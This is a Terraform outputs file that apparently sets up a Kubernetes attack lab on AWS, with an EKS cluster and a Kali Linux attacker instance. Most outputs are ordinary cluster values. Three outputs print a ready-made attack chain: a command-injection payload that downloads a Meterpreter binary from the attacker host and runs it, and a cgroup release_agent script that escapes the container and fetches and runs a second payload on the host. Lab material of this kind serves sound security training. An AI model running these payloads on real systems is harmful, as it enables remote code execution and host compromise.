################################################################################
# Cluster
################################################################################
output "cluster_name" {
  description = "The Amazon Resource Name (ARN) of the cluster"
  value       = module.eks.cluster_id
}

output "cluster_arn" {
  description = "The Amazon Resource Name (ARN) of the cluster"
  value       = module.eks.cluster_arn
}

output "cluster_certificate_authority_data" {
  description = "Base64 encoded certificate data required to communicate with the cluster"
  value       = module.eks.cluster_certificate_authority_data
}

output "cluster_endpoint" {
  description = "Endpoint for your Kubernetes API server"
  value       = module.eks.cluster_endpoint
}

output "cluster_id" {
  description = "The name/id of the EKS cluster. Will block on cluster creation until the cluster is really ready"
  value       = module.eks.cluster_id
}

# output "cluster_platform_version" {
#   description = "Platform version for the cluster"
#   value       = module.eks.cluster_platform_version
# }

output "cluster_status" {
  description = "Status of the EKS cluster. One of `CREATING`, `ACTIVE`, `DELETING`, `FAILED`"
  value       = module.eks.cluster_status
}


################################################################################
# Additional
################################################################################

# output "aws_auth_configmap_yaml" {
#   description = "Formatted yaml output for base aws-auth configmap containing roles used in cluster node groups/fargate profiles"
#   value       = module.eks.aws_auth_configmap_yaml
# }

output "region" {
  description = "AWS region"
  value       = var.region
}

################################################################################
# Additional
################################################################################

output "kali_linux_public_ip" {
  value = <<EOT

################################################################################
# KALI LINUX SSH:
################################################################################
  
ssh -i ${var.ssh_key_path} kali@${module.ec2_instance.public_ip}


EOT
}

output "command_injection" {
  value = <<-COMMAND_INJECTION

################################################################################
# USE THIS FOR THE COMMAND INJECTION:
################################################################################

;curl -vk http://${module.ec2_instance.public_ip}:8001/met-container -o /tmp/met

;chmod 777 /tmp/met

;/tmp/met

  
  COMMAND_INJECTION
}

output "escape_container_script" {
  value = <<-EOT

################################################################################
# USE THIS TO ESCAPE CONTAINER ONTO THE HOST
################################################################################

mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
echo "$(sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /proc/mounts)/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "curl -vk http://${module.ec2_instance.public_ip}:8001/met-host -o /run/met" >> /cmd
echo "chmod 777 /run/met" >> /cmd
echo "/run/met" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"


  EOT
}


output "cluster_security_group_id" {
  description = "Cluster security group that was created by Amazon EKS for the cluster. Managed node groups use this security group for control-plane-to-data-plane communication. Referred to as 'Cluster security group' in the EKS console"
  value       = module.eks.cluster_security_group_id
}

output "cluster_primary_security_group_id" {
  value = module.eks.cluster_primary_security_group_id
  
}